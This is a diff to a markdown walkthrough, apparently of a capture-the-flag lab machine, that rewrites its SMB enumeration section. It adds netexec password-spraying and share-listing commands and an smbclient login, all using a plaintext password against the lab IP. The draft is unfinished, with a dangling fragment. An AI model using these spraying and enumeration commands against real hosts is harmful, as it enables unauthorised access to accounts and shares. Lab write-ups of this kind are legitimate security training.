@@ -223,26 +223,19 @@ if __name__ == "__main__":
 ```
 ### SMB enumeration
 *Password spraying*
+```bash 
+netexec smb 10.129.95.154 -u creators.txt -p 'NewIntelligenceCorpUser9876' --continue-on-success
+```
+*share enumeration*
 ```bash
-netexec
-
-smb 10.129.95.154
-
--u
-
-Tiffany.Molina
-
--p
-
-'NewIntelligenceCorpUser9876'
-
---shares
+netexec smb 10.129.95.154 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares
+```
+*share discovery*
+```bash
+smbclient //10.129.95.154/IT -U 'Tiffany.Molina%NewIntelligenceCorpUser9876'
 ```
 
-```bash
-smbclient  //10.129.95.154/IT -U 'Tiffany.Molina%NewIntelligenceCorpUser9876'
-```
-
+There is a 
 ## Foothold
 
 How you got initial access.
